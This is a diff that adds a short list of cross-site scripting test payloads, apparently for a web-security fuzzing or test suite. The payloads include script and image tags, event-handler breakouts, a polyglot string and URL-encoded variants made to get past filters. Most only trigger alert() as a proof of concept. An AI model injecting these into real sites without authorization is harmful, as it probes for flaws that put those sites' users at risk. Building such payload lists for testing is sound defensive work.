@@ -1,0 +1,16 @@
+# Standard XSS
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+# Event Handlers
+" onmouseover="alert('XSS')"
+' onfocus="alert('XSS')"
+# Script Injection
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+# Nested tags
+<details open ontoggle=alert('XSS')>
+# Polyglot
+jaVasCript:/*-/*`/*\"/*--></script></title></style></textarea>--><img src=x onerror=alert('XSS')>
+# Encoding bypass
+%3cscript%3ealert('XSS')%3c/script%3e
+&lt;script&gt;alert('XSS')&lt;/script&gt;
